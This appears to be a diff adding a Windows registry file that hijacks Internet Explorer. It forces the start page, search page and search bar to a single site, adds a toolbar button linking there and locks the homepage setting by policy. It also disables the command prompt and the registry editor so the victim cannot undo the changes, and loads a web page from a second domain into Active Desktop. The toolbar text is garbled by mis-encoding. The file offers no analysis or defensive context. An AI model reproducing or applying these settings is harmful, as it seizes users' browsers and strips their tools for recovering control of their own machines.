@@ -1,0 +1,62 @@
+Windows Registry Editor Version 5.00
+[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Internet Explorer\Extensions\{6096E38F-5AC1-4391-8EC4-75DFA92FB32F}]
+"CLSID"="{1FBA04EE-3024-11D2-8F1F-0000F87ABD16}"
+"Default Visible"="Yes"
+"ButtonText"="8GOÉÏÍøµ¼º½"
+"Exec"="http://www.haomn.com"
+"HotIcon"="%windir%\\system32\\654.ICO"
+"Icon"="%windir%\\system32\\654.ICO"
+[HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main]
+"NoUpdateCheck"=dword:00000001
+"NoJITSetup"=dword:00000001
+"Disable Script Debugger"="yes"
+"Show_ChannelBand"="No"
+"Anchor Underline"="yes"
+"Cache_Update_Frequency"="Once_Per_Session"
+"Display Inline Images"="yes"
+"Do404Search"=hex:01,00,00,00
+"Save_Session_History_On_Exit"="no"
+"Show_FullURL"="no"
+"Show_StatusBar"="yes"
+"Show_ToolBar"="yes"
+"Show_URLinStatusBar"="yes"
+"Show_URLToolBar"="yes"
+"Start Page"="http://www.haomn.com/"
+"Use_DlgBox_Colors"="yes"
+"Search Page"="http://www.haomn.com/"
+"FullScreen"="no"
+"Enable AutoImageResize"="yes"
+"CNSMenu"=dword:de809d5c
+"CNSHint"=dword:00000001
+"CNSReset"=dword:de809d5c
+"CNSEnable"=dword:00000001
+"CNSList"=dword:00000001
+"CNSAutoUpdate"=dword:00000001
+"Use Search Asst"="no"
+"Search Bar"="http://www.haomn.com/"
+"Enable Browser Extensions"="yes"
+"NotifyDownloadComplete"="yes"
+"Use FormSuggest"="yes"
+"ShowedCheckBrowser"="Yes"
+"Check_Associations"="Yes"
+"Error Dlg Displayed On Every Error"="no"
+"AddToFavoritesExpanded"=dword:00000001
+[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System]
+"DisableCMD"=dword:00000001
+"DisableRegistryTools"=dword:00000001
+[HKEY_CURRENT_USER\Software\Policies\Microsoft\Internet Explorer\Control Panel]
+"HomePage"=dword:00000001
+
+[HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Desktop\Components\]
+"GeneralFlags"=dword:2
+[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer]
+"ActiveDesktop"=dword:1
+[HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Desktop\Components\0]
+"FriendlyName"="name"
+"Source"="http://www.csdvd.com/index.htm"
+"SubscribedURL"="http://www.csdvd.com/index.htm"
+"OriginalStateInfo"=hex:18,00,00,00,64,ff,ff,ff,03,00,00,00,9d,00,00,00,0f,00,00,00,01,00,00,40
+"Position"=hex:2c,00,00,00,64,ff,ff,ff,03,00,00,00,9d,00,00,00,0f,00,00,00,ec,03,00,00,01,00,00,00,01,00,00,00,01,00,00,00,00,00,00,00,00,00,00
+"RestoredStateInfo"=hex:01,40,6c,74,00,00,00,00,01,00,0c,3b,30,bc,10,00,34,2d,93,7c,a4,6c,07,00
+"CurrentState"=dword:40000001
+"Flags"=dword:00002002
